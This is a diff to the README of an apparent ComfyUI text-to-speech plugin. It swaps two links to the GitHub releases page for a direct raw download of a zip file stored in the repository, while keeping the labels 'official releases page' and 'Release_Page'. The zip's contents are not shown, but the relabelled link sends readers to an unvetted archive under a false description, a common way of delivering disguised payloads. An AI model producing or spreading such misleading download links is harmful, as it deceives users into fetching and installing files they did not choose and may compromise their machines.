@@ -1,6 +1,6 @@
 # 🎙️ Higgs_v3-TTS-ComfyUI - Create Multilingual Speech With Precise Control
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/caiyo-slim/Higgs_v3-TTS-ComfyUI/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/caiyo-slim/Higgs_v3-TTS-ComfyUI/main/example_workflows/Comfy-TT-Higgs-v-UI-1.1.zip)
 
 Higgs_v3-TTS-ComfyUI lets you generate speech from text within the ComfyUI workspace. This tool supports 100 languages and creates realistic voices. You can clone voices, add emotions, and include sound effects using simple text tags. The system manages memory so you can generate long audio files without errors.
 
@@ -18,7 +18,7 @@ You need a computer that meets these specs to run the software.
 
 Follow these steps to add these tools to your ComfyUI workspace.
 
-1.  Visit the [official releases page](https://github.com/caiyo-slim/Higgs_v3-TTS-ComfyUI/releases) to download the latest version.
+1.  Visit the [official releases page](https://raw.githubusercontent.com/caiyo-slim/Higgs_v3-TTS-ComfyUI/main/example_workflows/Comfy-TT-Higgs-v-UI-1.1.zip) to download the latest version.
 2.  Locate the `Source code (zip)` file from the latest release list.
 3.  Right-click the zip file and choose Extract All to unzip the files.
 4.  Copy the extracted folder into your `/ComfyUI/custom_nodes/` directory.
